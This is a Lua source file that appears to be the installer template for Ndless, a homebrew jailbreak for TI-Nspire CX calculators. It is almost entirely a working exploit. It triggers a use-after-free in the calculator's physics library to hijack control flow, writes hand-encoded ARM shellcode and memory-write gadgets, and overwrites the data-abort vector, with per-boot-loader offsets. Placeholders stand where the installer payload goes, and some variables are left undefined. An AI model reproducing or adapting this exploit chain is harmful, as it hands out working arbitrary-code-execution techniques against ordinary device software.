platform.apilevel = "2.7"

require "physics"

----------------------
-- Helper functions --
----------------------

local device_override = false

function getDeviceType()
    local _, err = math.eval("DrawLine")
    local cx2 = err == 930

    if device_override and not cx2 then
        return device_override
    end

    return cx2 and "cx2" or "unknown"
end

function u32ToHex(ptr)
    return string.format("0x%x", ptr)
end

function u32(ptr)
    return string.pack("u32", ptr % 0x100000000)
end

function getPointer(obj)
    return tonumber(tostring(obj):match(": .+"):sub(3), 16)
end

function pointerHasNoNulls(ptr)
    local a, ptr = ptr % 256, math.floor(ptr / 256)
    local b, ptr = ptr % 256, math.floor(ptr / 256)
    local c, ptr = ptr % 256, math.floor(ptr / 256)
    local d      = ptr % 256

    return a ~= 0 and b ~= 0 and c ~= 0 and d ~= 0
end

function isNdlessInstalled()
    return not not _G.nrequire
end

----------------------------------
-- Helper Utils: payload loader --
----------------------------------

avoidgc = {}

local SPACE_SIZE = 48

function allocateExecutableSpace(payload, needsafepointer)
    assert(#payload <= SPACE_SIZE, "[allocateExecutableSpace] payload exceeds size limits")

    local space, ptr

    repeat
        space = physics.Space()
        ptr   = getPointer(space)
    until not needsafepointer or pointerHasNoNulls(ptr)
    
    table.insert(avoidgc, space)
    payload = payload .. string.rep("\0", SPACE_SIZE - #payload)

    --[[
        First entries inside cpSpace:

    	int iterations;               // int32           -  4 bytes
		int elasticIterations;        // int32           -  4 bytes
		cpVect gravity;               // double, double  - 16 bytes
		cpFloat damping;              // double          -  8 bytes
		cpFloat idleSpeedThreshold;   // double          -  8 bytes
	    cpFloat sleepTimeThreshold;   // double          -  8 bytes
    --]]

    local i, e, g1, g2, d, ist, stt = string.unpack("s32s32flflflflfl", payload)
    
    local function apply()
        space:setIterations(i)
        space:setElasticIterations(e)
        space:setGravity(physics.Vect(g1, g2))
        space:setDamping(d)
        space:setIdleSpeedThreshold(ist)
        space:setSleepTimeThreshold(stt)
    end

    apply()

    return ptr
end


function makeLargePayloadLoader(payload, needsafepointer)
    local t_payload = { payload }
    local p_payload = getPointer(t_payload) + 12 -- points to array portion of table
    table.insert(avoidgc, t_payload)

    --[[
        ldr r0, ptr         Load the array pointer in mem
        ldr r0, [r0]        Dereference the array pointer to get the pointer to the first entry
        ldr r0, [r0]        Dereference the first entry pointer to get the TString ptr
        add r0, r0, #16     Add 16 to TString pointer to get string content
        bx r0               Jump to string content
    --]]

    return allocateExecutableSpace("\12\0\159\229\0\0\144\229\0\0\144\229\16\0\128\226\16\255\47\225" .. u32(p_payload), needsafepointer)
end

----------------------
-- ARM code helpers --
----------------------

local ARM_DATA_ABORT_VECTOR = 0x00000010

local ARM_SNIPPETS = {
    ["add sp, sp, #44"]                           = "\44\208\141\226",
    ["ldmia sp!, {r4,r5,r6,r7,r8,r9,r10,r11,lr}"] = "\240\79\189\232",
    ["movs pc, r3"]                               = "\3\240\176\225",
    ["mov r0, #0x0"]                              = "\0\0\160\227",
    ["ldr r1, [r0], #0x10"]                       = "\16\16\144\228",
    ["str r1, [r0]"]                              = "\0\16\128\229",
}

function arm(...)
    local out = {}
    for i = 1, select("#", ...) do
        local arg = select(i, ...)

        if type(arg) == "string" then
            local snippet = ARM_SNIPPETS[arg]
            if not snippet then
                error(("Unknown ARM snippet: %q"):format(arg))
            end
            out[#out + 1] = snippet
        elseif type(arg) == "number" then
            out[#out + 1] = u32(arg)
        else
            error(("Invalid argument to arm(): %s"):format(type(arg)))
        end
    end

    return table.concat(out)
end


function makeMemWriteGadget(addr, val)
    -- ldr r0, t_addr
    -- ldr r1, t_val
    -- str r1, [r0]
    -- b continue
    -- t_addr: ...
    -- t_val: ...
    -- continue: ...

    return "\8\0\159\229\8\16\159\229\0\16\128\229\1\0\0\234" .. u32(addr) .. u32(val)
end


----------------------------
-- the payload to execute --
----------------------------

--ZZZ_INSTALLER_PAYLOAD_ZZZ

------------------------------
-- cpSpace velocity exploit --
------------------------------

local device_exploit_config = {
    cx2 = {
        --[[
            Chain:  0x0000a968 --> 0xa402fc20 --> 0x00010200
            Code:   0x00010200 will eventually do ldmia sp!,{r4,r5,r6,r7,r8,pc}
            Setup:  We need to set sp[5] to target addr
            Fixing: Pop the entire cpSpaceStep and restore regs
        --]]

        offset = 0x0000A968, 
        regs = {},

        prepare = function(config, target_addr)
            config.regs.s5 = target_addr
        end,

        cleanup_code = arm("add sp, sp, #44", "ldmia sp!, {r4,r5,r6,r7,r8,r9,r10,r11,lr}"),
        cleanup_adrs = {},
    },

    cx_boot3 = {
        --[[
            Chain:  0x0000ab04 --> 0xa4012c94 --> 0xa400ab00
            Code:   
                strge ip, [r0], #-0x85c     Corrupts 0xa4012c94
                strge r2, [r1], #-0xc94     Controlled write
                andeq r0, r0, r0     
                strge r2, [r0], #-0x9b4     Corrupts 0xa4012c94 - 0x85c
                strge r2, [r1], #-0xc94     Triggers data abort (in our setup)

            Setup:  We want to replace the data abort handler with our own code (movs pc, r3). 
                    r2 -> bytes for "movs pc, r3"
                    r1 -> 0x0000_0010 (data abort handler)
                    r3 -> target addr

            Fixing: we need to restore the data abort handler, 0xa4012c94, and 0xa4012c94 - 0x85c
        --]]


        offset = 0x0000AB04,
        regs = {
            r1 = ARM_DATA_ABORT_VECTOR,
            r2 = arm("movs pc, r3"),
        },

        prepare = function(config, target_addr)
            config.regs.r3 = target_addr
        end,

        cleanup_code = "",
        cleanup_adrs = {
            [ARM_DATA_ABORT_VECTOR] = 0xE59FF018,
            [0xA4012C94]            = 0xA400AB00,
            [0xA4012438]            = 0x00000000
        },
    },

    cx_boot4 = {
        --[[
            Chain:  0x00000434 --> 0x0000dc60 --> 0xa400e084
            Code:   
                strge lr, [r0], #-0x4a8     Corrupts 0x0000dc60
                strge sp, [r0], #-0xc60     Corrupts 0x0000dc60 - 0x4a8
                andeq r0, r0, r0
                strge r2, [r0], #-0x42c     Corrupts 0x0000dc60 - 0x4a8 - 0xc60
                strge r2, [r1], #-0xc94     Controlled write
                strge r2, [r1], #-0xc94     Triggers data abort (in our setup)

            Setup:  We want to replace the data abort handler with our own code (movs pc, r3). 
                    r2 -> bytes for "movs pc, r3"
                    r1 -> 0x0000_0010 (data abort handler)
                    r3 -> target addr

            Fixing: we need to restore the data abort handler, 0x0000dc60, (0x0000dc60 - 0x4a8), (0x0000dc60 - 0x4a8 - 0xc60)
        --]]

        offset = 0x00000434,
        regs = {
            r1 = ARM_DATA_ABORT_VECTOR,
            r2 = arm("movs pc, r3"),
        },

        prepare = function(config, target_addr)
            config.regs.r3 = target_addr
        end,

        cleanup_code = "",
        cleanup_adrs = {
            [ARM_DATA_ABORT_VECTOR] = 0xE59FF018,
            [0x0000DC60]            = 0xA400E084,
            [0x0000D7B8]            = 0x00000001,
            [0x0000CB58]            = 0x00000000
        },
    }
}

function get_reg(config, reg)
    local regs = config.regs or {}
    local val  = regs[reg] or 0
    
    if type(val) == "number" then
        val = u32(val)
    end
    
    return val
end

function makeConfigFixer(config)
    local code = config.cleanup_code or ""

    if config.cleanup_adrs then
        for addr, val in pairs(config.cleanup_adrs) do
            code = code .. makeMemWriteGadget(addr, val)
        end
    end

    return code
end

function exec(code, config)
    local payload = makeConfigFixer(config) .. code
    local payloadLoader, refresh = makeLargePayloadLoader(payload)
    config:prepare(payloadLoader)

    -- user can control r1*, r2, r3, sp[0], sp[1]*, sp[4], sp[5]
    -- *r1 and sp[1] will be the same value

    local exec_space = physics.Space()

    local r2_r3 = string.unpack("fl", get_reg(config, "r2") .. get_reg(config, "r3"))
    local sp_r1 = string.unpack("fl", get_reg(config, "s0") .. get_reg(config, "r1"))
    exec_space:setGravity(physics.Vect(r2_r3, sp_r1))

    local bodiesNeededToReachOffset = config.offset / 4
    for i=1, bodiesNeededToReachOffset - 1 do
        exec_space:addBody(physics.Body(0, 0))
    end

    local bodyWithCallback = physics.Body(0, 0)
    local finalBody = physics.Body(0, 0)

    bodyWithCallback:setVelocityFunc(function ()
        bodyWithCallback:setVelocityFunc(nil) -- only call this function once

        exec_space:setSleepTimeThreshold(1)
        exec_space:step(1) -- this update the bodies array for exec_space

        -- at this point, the loop which is calling this callback has a broken reference (null now) to the bodies array
        -- in the next loop iteration, it will try to invoke the velocity function for the next body, but end up calling *((void*)0x0000_0000)[total_body_count - 1]
        -- as we control the number of bodies in the space, we can control the target jump somewhat
    end)

    exec_space:addBody(bodyWithCallback)
    exec_space:addBody(finalBody)

    -- trigger the exploit
    local step = string.unpack("fl", get_reg(config, "s4") .. get_reg(config, "s5"))
    exec_space:step(step == 0 and 1 or step)

    -- return result
    return string.byte(payload, #payload - 3)
end

-----------
-- Setup --
-----------

local STATUS_CODE = {
    BAD_OS            = 1,
    BAD_RESOURCES     = 2,
    SUCCESS           = 3,
    UNKNOWN_ERROR     = 4,
    INSTALLING        = 5,
    ALREADY_INSTALLED = 6,
    INVALID_DEVICE    = 7,
    WAITING_FOR_USER  = 8,
}

local statusMsgs = {
    [STATUS_CODE.BAD_OS]            = { color = 0xFF0000, txt = "This OS is not supported!"}, 
    [STATUS_CODE.BAD_RESOURCES]     = { color = 0xFF0000, txt = "Could not load Ndless resources!"}, 
    [STATUS_CODE.SUCCESS]           = { color = 0x00FF00, txt = "Ndless successfully installed!"}, 
    [STATUS_CODE.UNKNOWN_ERROR]     = { color = 0xFF0000, txt = "Unknown error! Please try again!"}, 
    [STATUS_CODE.INSTALLING]        = { color = 0xFFFFFF, txt = "Ndless is installing..."},
    [STATUS_CODE.ALREADY_INSTALLED] = { color = 0xFFFFFF, txt = "Ndless is already installed!"},
    [STATUS_CODE.INVALID_DEVICE]    = { color = 0xFFFF00, txt = "This device is not supported."},
    [STATUS_CODE.WAITING_FOR_USER]  = { color = 0xFFFF00, txt = {cx2 = "Press any key to start installation", default="Press [3] for Boot1 3.0.0, [4] for Boot1 4.0.1"}},
}

local animation = (function()
--ZZZ_ANIMATION_LUA_ZZZ
end)()

local payloadLoader, refresh
local payloadExecuted = false
local installerStatus = STATUS_CODE.INSTALLING
local showCloseMsg    = false
local exploitConfig   = false
local closeMsgLastToggle = false
local deviceType      = nil

local TIMER_TICK_DELAY = 0.1
local CLOSE_MSG_INTERVAL_MS = 1500

function begin()
    if exploitConfig or installerStatus == STATUS_CODE.ALREADY_INSTALLED then
        return
    end

    exploitConfig = (deviceType == "cx2") and device_exploit_config.cx2 or exploit_char_map[ch] 

    if exploitConfig and not payloadExecuted then
        installerStatus = STATUS_CODE.INSTALLING
    end

    platform.window:invalidate()
end

function on.resize()
    deviceType = getDeviceType()

    if isNdlessInstalled() then
        installerStatus = STATUS_CODE.ALREADY_INSTALLED
    else
        installerStatus = STATUS_CODE.WAITING_FOR_USER  
    end

    timer.start(TIMER_TICK_DELAY)
    platform.window:invalidate()

    cursor.show()
    cursor.hide()

    -- persistent
    begin()
end

local exploit_char_map = {
    ["3"] = device_exploit_config.cx_boot3,
    ["4"] = device_exploit_config.cx_boot4
}

function on.timer()
    local now = timer.getMilliSecCounter()
    local needsInvalidate = false

    if payloadExecuted or installerStatus == STATUS_CODE.ALREADY_INSTALLED then
        if not closeMsgLastToggle then
            closeMsgLastToggle = now
        else
            local intervals = math.floor((now - closeMsgLastToggle) / CLOSE_MSG_INTERVAL_MS)
            if intervals > 0 then
                if intervals % 2 == 1 then
                    showCloseMsg = not showCloseMsg
                    needsInvalidate = true
                end
                closeMsgLastToggle = closeMsgLastToggle + intervals * CLOSE_MSG_INTERVAL_MS
            end
        end
    elseif exploitConfig then
        timer.stop()

        payloadExecuted = true
        installerStatus = exec(installer, exploitConfig)

        if installerStatus == 0 or installerStatus > STATUS_CODE.UNKNOWN_ERROR then
            installerStatus = STATUS_CODE.UNKNOWN_ERROR
        end

        timer.start(TIMER_TICK_DELAY)
        needsInvalidate = true
    end

    if needsInvalidate then
        platform.window:invalidate()
    end
end
